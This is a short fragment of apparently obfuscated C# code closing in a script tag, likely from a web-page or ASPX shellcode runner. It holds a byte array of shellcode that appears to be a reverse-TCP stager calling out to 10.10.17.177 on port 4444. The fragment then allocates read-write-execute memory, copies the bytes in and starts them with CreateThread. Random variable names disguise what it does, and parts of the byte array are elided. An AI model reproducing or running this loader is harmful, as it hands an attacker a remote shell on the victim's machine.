...
0x10,0x8b,0x42,0x3c,0x57,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4c,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,
...
0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x0a,0x68,0x0a,0x0a,0x11,0xb1,0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,
...
0x00,0x53,0xff,0xd5 };
        ...
        IntPtr y_NTfvWtx9aO = VirtualAlloc(IntPtr.Zero,(UIntPtr)pcyCFOcYS.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(pcyCFOcYS,0,y_NTfvWtx9aO,pcyCFOcYS.Length);
        IntPtr ao_RP2ztf16 = IntPtr.Zero;
        IntPtr tlHaf_nVS6 = CreateThread(IntPtr.Zero,UIntPtr.Zero,y_NTfvWtx9aO,IntPtr.Zero,0,ref ao_RP2ztf16);
    }
</script>
